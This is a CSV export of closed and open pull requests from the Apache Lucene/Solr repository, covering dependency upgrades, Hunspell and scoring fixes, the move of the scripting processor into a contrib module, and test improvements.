"#","No","Issue Title","Issue Details","State","Labels","User name","created","Updated"
"","2021","SOLR-14844: upgrade jetty to 9.4.32.v20200930","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Upgrades Jetty to 9.4.32.v20200930 as described in JIRA ticket.  # Solution  After upgrading the compression related tests started to fail, so some of the broken unit tests were modified also. The reasons behind the broken unit tests are described in the original ticket.  Also, created SOLR-14945 to track the need to improve HttpSolrClient compression handling to avoid problems like this in the future.  # Tests  BasicHttpSolrClientTest had to be modified in order to match Jetty's new behaviour for empty responses.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ ] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","samuelgmartinez","2020-10-23T17:58:55Z","2020-10-24T20:01:38Z"
"","2003","SOLR-14844: Upgrade Jetty to 9.4.32.v20200930","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Upgrades Jetty to 9.4.32.v20200930 as described in JIRA ticket.  # Solution  After upgrading the compression related tests started to fail, so some of the broken unit tests were modified also. The reasons behind the broken unit tests are described in the original ticket.  Also, created SOLR-14945 to track the need to improve HttpSolrClient compression handling to avoid problems like this in the future.  # Tests  BasicHttpSolrClientTest had to be modified in order to match Jetty's new behaviour for empty responses.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ ] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","samuelgmartinez","2020-10-18T19:43:21Z","2020-10-24T20:01:12Z"
"","2082","SOLR-15002: Upgrade HttpClient to 4.5.13","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Upgrade HttpClient 4.5.13 and HttpCore 4.4.13  # Solution  Upgrade HttpClient 4.5.13 and HttpCore 4.4.13  # Tests  Unit tests.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","asalamon74","2020-11-16T10:46:18Z","2021-04-08T15:32:01Z"
"","2413","LUCENE-9799: Hunspell: don't check second-level affixes when the first level isn't a continuation","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Two-stage affix removal is quite expensive and can result on O(n^2) performance, especially with many zero affixes like in French  # Solution  Don't go to the second stage if on the first one we've removed an affix which definitely isn't compatible with any other affix on the second stage; create a set of all continuation flags to check that quickly.  # Tests  No new tests. `TestPerformance.de/fr` show about 2x speedups.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-22T09:32:52Z","2021-02-22T11:18:20Z"
"","2253","LUCENE-9702: Hunspell: support alternate casing for short language codes","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Turkish `I`s don't work with `LANG tr`  # Solution  Support `tr` as well as `tr_TR`  # Tests  `dotless_i` from Hunspell/C++  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-01-27T15:57:24Z","2021-01-29T10:49:42Z"
"","2223","LUCENE-9681: deduplicate decodeFlags+hasFlag checks","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Too much repetitive code.  # Solution  Introduce methods more suited for the frequent usage patterns  # Tests  no new functionality, no tests  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-01-20T12:45:53Z","2021-01-20T17:23:42Z"
"","2397","LUCENE-9776: Hunspell: allow to inflect the last part of COMPOUNDRULE compounds","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  To support Dutch ""15-urige"" (inflected ""15-urig"")  # Solution  To allow affixes and honor ONLYINCOMPOUND there but not COMPOUNDFLAG/COMPOUNDEND, introduce yet another compound word context  COMPOUND_RULE_END, use it in the last part of a compound rule.  # Tests  `compoundrule4` expanded  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-18T09:26:09Z","2021-02-19T20:08:45Z"
"","2434","LUCENE-9813: Add a convenience constructor IntsRef(int[])","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  to avoid repetitive passing of 0 and array.length everywhere  # Solution  Add the constructor, call it where applicable  # Tests  Nothing dedicated, but some tests now use the new API and still pass :)  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-26T09:27:35Z","2021-03-10T13:41:14Z"
"","2138","LUCENE-9635: BM25FQuery - Mask encoded norm long value in array lookup","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Through some experimentation with with the BM25FQuery on long documents, I've discovered that there is a bug that doesn't mask the encoded norm's long value during scoring. For long documents (or long fields) this may cause ArrayIndexOutOfBoundsExceptions.  The line where I suspect the bug is being exposed is here https://github.com/apache/lucene-solr/blob/master/lucene/sandbox/src/java/org/apache/lucene/sandbox/search/MultiNormsLeafSimScorer.java#L131  Here is a similar use in BM25Similarity with the masking https://github.com/apache/lucene-solr/blob/c413656b627160d49eb9e9f1f84ec4945db80f0e/lucene/core/src/java/org/apache/lucene/search/similarities/BM25Similarity.java#L233  My experimentation shows that to expose this bug, there must be a match for a token in more than one field (which is what BM25FQuery is for). In addition one of the fields must be >= 32792 tokens long.  I've provided tests in the pull request to demonstrate this.  # Solution  Change the array lookup to norm & 0xff  # Tests  Added tests for single and multiple long documents that exposes this problem.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [ ] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","yiluncui","2020-12-09T21:43:26Z","2020-12-18T15:15:38Z"
"","2076","LUCENE-9603: Remove redundant fieldType.stored() check","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  This removes just a redundant check.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [ ] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","mrkm4ntr","2020-11-11T07:55:35Z","2021-03-02T01:18:44Z"
"","2097","LUCENE-9537","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  This pull request implements logic from our academic search engine Indri: http://www.lemurproject.org/indri.php.  The functionality that is implemented is a smoothing score for search terms or subqueries that are not present in the document being scored.  The smoothing score acts like an idf so that documents that do not have terms or subqueries that are more frequent in the index are not penalized as much as documents that do not have less frequent terms or subqueries.  Additionally, Indri's dirichelet smoothing similarity has been added.  # Solution  The smoothingScore method has been added to the Scorable interface and implemented in the abstract class Scorer.  The classes IndriAndQuery, IndriAndWeight, and IndriAndScorer have been added to call the smoothingScore method on documents where the search term or subquery are not present.  The class IndriDirichletSimilarity has been added for implementing Indri's equation for the Language Model with Dirichlet smoothing.  # Tests  TestIndriAndQuery and TestIndriDirichletSmoothing have been added.  I am happy to expand upon these tests and implement more tests.   # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [ ] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","cammiemw","2020-11-25T15:03:18Z","2022-01-26T18:15:13Z"
"","2215","SOLR-14067: v3 Create /contrib/scripting module with ScriptingUpdateProcessor","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  This PR supersecedes the work done in #2016, as it doesn't drag all the commits made to master.   I followed the steps recommend by Joel Bernstein in another PR to clean up the commit history in creating this PR.  To improve our security posture, this moves the ScriptingUpdateProcessor to a new contrib module that isn't installed in Solr by default.   This is also a chance to clean up the name of the processor from the old slightly awkward name ""StatelessScriptingUpdateProcessor"" to a simpler name.  # Solution  * Created a new `/contrib/scripting` module, and move the code and tests related to scripting under it.    * Relocating the code under `org.apache.solr.scripting` avoids a ""split package"" issue. * Updated all the references to `StatelessScriptingUpdateProcessor` to `ScriptingUpdateProcessor` in code and ref guide.    # Tests  Please describe the tests you've developed or run to confirm this patch implements the feature or solves the problem.  # Checklist  Please review the following and check all that apply:  - [ X] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [ X] I have created a Jira issue and added the issue ID to my pull request title. - [ X] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ X] I have developed this patch against the `master` branch. - [ X] I have run `./gradlew check`. - [ X] I have added tests for my changes. - [ X] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","epugh","2021-01-18T12:27:34Z","2021-01-25T15:14:16Z"
"","2257","SOLR-14067: v4 Create /contrib/scripting module with ScriptingUpdateProcessor","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  This PR supersecedes the work done in #2016, as it doesn't drag all the commits made to master.   I followed the steps recommend by Joel Bernstein in another PR to clean up the commit history in creating this PR.  The prevous version of this PR had unit test failures, and this one attempts to fix it up.  To improve our security posture, this moves the ScriptingUpdateProcessor to a new contrib module that isn't installed in Solr by default.   This is also a chance to clean up the name of the processor from the old slightly awkward name ""StatelessScriptingUpdateProcessor"" to a simpler name.  # Solution  * Created a new `/contrib/scripting` module, and move the code and tests related to scripting under it.    * Relocating the code under `org.apache.solr.scripting` avoids a ""split package"" issue. * Updated all the references to `StatelessScriptingUpdateProcessor` to `ScriptingUpdateProcessor` in code and ref guide. * Introduce a mock `ScriptingUpdateProcessor` for the `TestConfigSetsAPI` test on untrusted and trusted configsets.    # Tests  Please describe the tests you've developed or run to confirm this patch implements the feature or solves the problem.  # Checklist  Please review the following and check all that apply:  - [ X] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [ X] I have created a Jira issue and added the issue ID to my pull request title. - [ X] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ X] I have developed this patch against the `master` branch. - [ X] I have run `./gradlew check`. - [ X] I have added tests for my changes. - [ X] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","epugh","2021-01-27T21:52:28Z","2021-01-29T21:47:54Z"
"","1711","SOLR-14702: Remove oppressive language (part1)","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  This PR removes all references of ""master slave"" from the Solr code base. this should've happened years ago as it can result in alienating many people working with the project.  # Solution  Replaces master with leader and slave with follower.  # Tests  Run standard tests.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `ant precommit` and the appropriate test suite. - [x] I have added tests for my changes. - [x] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","MarcusSorealheis","2020-08-02T10:01:39Z","2020-08-05T22:51:51Z"
"","1733","LUCENE-9450 Use BinaryDocValues in the taxonomy writer","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  This PR modifies the taxonomy writer and reader implementation to use BinaryDocValues instead of StoredValues.  The taxonomy index uses stored fields today and must do a number of stored field lookups for each query to resolve taxonomy ordinals back to human presentable facet labels.  # Solution  Change the storage format to use DocValues  # Tests  ant test fails because `.binaryValue()` returns a `NullPointerException`  To reproduce the error: `ant test  -Dtestcase=TestExpressionAggregationFacetsExample -Dtests.method=testSimple -Dtests.seed=4544BD51622879A4 -Dtests.slow=true -Dtests.badapples=true -Dtests.locale=si -Dtests.timezone=Antarctica/DumontDUrville -Dtests.asserts=true -Dtests.file.encoding=US-ASCII`  gives  ```nit4:pickseed] Seed property 'tests.seed' already defined: 4544BD51622879A4     [mkdir] Created dir: /Users/gauworah/opensource/mystuff/lucene-solr/lucene/build/demo/test/temp    [junit4]  says Привет! Master seed: 4544BD51622879A4    [junit4] Executing 1 suite with 1 JVM.    [junit4]     [junit4] Started J0 PID(76859@localhost).    [junit4] Suite: org.apache.lucene.demo.facet.TestExpressionAggregationFacetsExample    [junit4]   2> NOTE: reproduce with: ant test  -Dtestcase=TestExpressionAggregationFacetsExample -Dtests.method=testSimple -Dtests.seed=4544BD51622879A4 -Dtests.slow=true -Dtests.badapples=true -Dtests.locale=si -Dtests.timezone=Antarctica/DumontDUrville -Dtests.asserts=true -Dtests.file.encoding=US-ASCII    [junit4] ERROR   0.61s | TestExpressionAggregationFacetsExample.testSimple <<<    [junit4]    > Throwable #1: java.lang.NullPointerException    [junit4]    >        at __randomizedtesting.SeedInfo.seed([4544BD51622879A4:7DF799AF45DBAD75]:0)    [junit4]    >        at org.apache.lucene.index.MultiDocValues$3.binaryValue(MultiDocValues.java:403)    [junit4]    >        at org.apache.lucene.facet.taxonomy.directory.DirectoryTaxonomyReader.getPath(DirectoryTaxonomyReader.java:328)    [junit4]    >        at org.apache.lucene.facet.taxonomy.FloatTaxonomyFacets.getTopChildren(FloatTaxonomyFacets.java:151)    [junit4]    >        at org.apache.lucene.demo.facet.ExpressionAggregationFacetsExample.search(ExpressionAggregationFacetsExample.java:107)    [junit4]    >        at org.apache.lucene.demo.facet.ExpressionAggregationFacetsExample.runSearch(ExpressionAggregationFacetsExample.java:118)    [junit4]    >        at org.apache.lucene.demo.facet.TestExpressionAggregationFacetsExample.testSimple(TestExpressionAggregationFacetsExample.java:28)    [junit4]    >        at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)    [junit4]    >        at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)    [junit4]    >        at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)    [junit4]    >        at java.base/java.lang.reflect.Method.invoke(Method.java:567)    [junit4]    >        at java.base/java.lang.Thread.run(Thread.java:830) ```  3 other tests also fail at the function call # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [ ] I have run `ant precommit` and the appropriate test suite. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).  **This is a draft PR**","closed","","gautamworah96","2020-08-10T21:40:13Z","2020-11-12T22:13:32Z"
"","2090","LUCENE-9618: demo unit test","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  This PR is not intended to be merged. It's just for demonstration of issues mentioned in [LUCENE-9618](https://issues.apache.org/jira/browse/LUCENE-9618)","closed","","zhaih","2020-11-19T18:37:32Z","2020-11-22T06:41:49Z"
"","2185","LUCENE-9659 inequality support in payload check query","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  This PR is in support for LUCENE-9659 it updates the SpanPayloadCheckQuery to support inequality operations on string/integer/floating point encoded payload values.    # Solution  This creates a factory that implements the operation logic for decoding the payload and applying the inequality test to a reference payload. Existing behavior is preserved if the operation is null or ""eq"".  # Tests  A unit test was added for this new functionality to test string payloads greater than / less than / greater than or equal / less than or equal.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","kwatters","2021-01-07T20:36:28Z","2021-02-17T18:30:15Z"
"","1928","LUCENE-9444: Improve test coverage for TaxonomyFacetLabels","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  This PR improves test coverage for `TaxonomyFacetLabels` ( added in [PR 1893](https://github.com/apache/lucene-solr/pull/1893/files) ) by exercising the API - `TaxonomyFacetLabels.nextFacetLabel(docId, facetDimension)` to fetch facet labels for a specific dimension.  # Solution  The solution enhances the test method - `TestTaxonomyFacetCounts.testRandom()` and does the following   - Pick a dimension at random   - Filter expected facet labels to retain entries for chosen dimension only.   - Invoke the API - `TaxonomyFacetLabels.nextFacetLabel(docId, facetDimension)` to get facet labels for specific dimension.   - Ensures that `expected` and `actual` facet labels match.  # Tests    - `TestTaxonomyFacetCounts.testRandom()` is enhanced to improve test coverage for `TaxonomyFacetLabels`.    - `FacetTestCase` is refactored to add a `dimension` parameter to utility method `getAllTaxonomyFacetLabels(...)`   # Checklist  Please review the following and check all that apply:  - [x ] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [ x] I have created a Jira issue and added the issue ID to my pull request title. - [ x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ x] I have developed this patch against the `master` branch. - [x ] I have run `./gradlew check`. - [x ] I have added tests for my changes. - [x ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","goankur","2020-09-28T23:45:01Z","2020-09-30T17:21:18Z"
"","2014","LUCENE-8183: Added the abbility to get noSubMatches and noOverlapping Matches","* SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  This is the solution for LUCENE-8183. The change is taken form the patch in the workitem.  # Solution  ## New Parameters: noSubMatches: true/false noOverlappingMatches: true/false together with the existing onlyLongestMatch those can be used to define what subwords should be added as tokens. Functionality is as described above.  Typically users will only want to include one of the three attributes as enabling noOverlappingMatches is the most restrictive and noSubMatches is more restrictive as onlyLongestMatch. When enabling a more restrictive option the state of the less restrictive does not have any effect.  Because of that it would be an option to refactor this to an single attribute with different setting, but this would require to think about backward compatibility for configurations that do use onlyLongestMatch=true at the moment.  ## Algorithm If processing of subWords is deactivated (any of onlyLongestMatch, noSubMatches, noOverlappingMatches is active) the algorithm first checks if the token is part of the dictionary. If so it returns immediately. This is to avoid adding tokens for subwords if the token itself is in the dictionary (see #testNoSubAndTokenInDictionary for more info).  I changed the iteration direction of the inner for loop to start with the longest possible subword as this simplified the code.  NOTE: that this also changes the order of the Tokens in the token stream but as all tokens are at the same position that should not make any difference. I had however to modify some existing tests as those where sensitive to the ordering  # Tests  I added two test methods in TestCompoundWordTokenFilter  1. #testNoSubAndNoOverlap() tests the expected behaviour of the noSubMatches and noOverlappingMatches options 2. #testNoSubAndTokenInDictionary() tests that no tokens for subwords are added in the case that the token in part of the dictionary  In addition TestHyphenationCompoundWordTokenFilterFactory#testLucene8183() asserts that the new configuration options are parsed.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","open","","MartinDemberger","2020-10-21T12:40:44Z","2021-01-13T20:40:15Z"
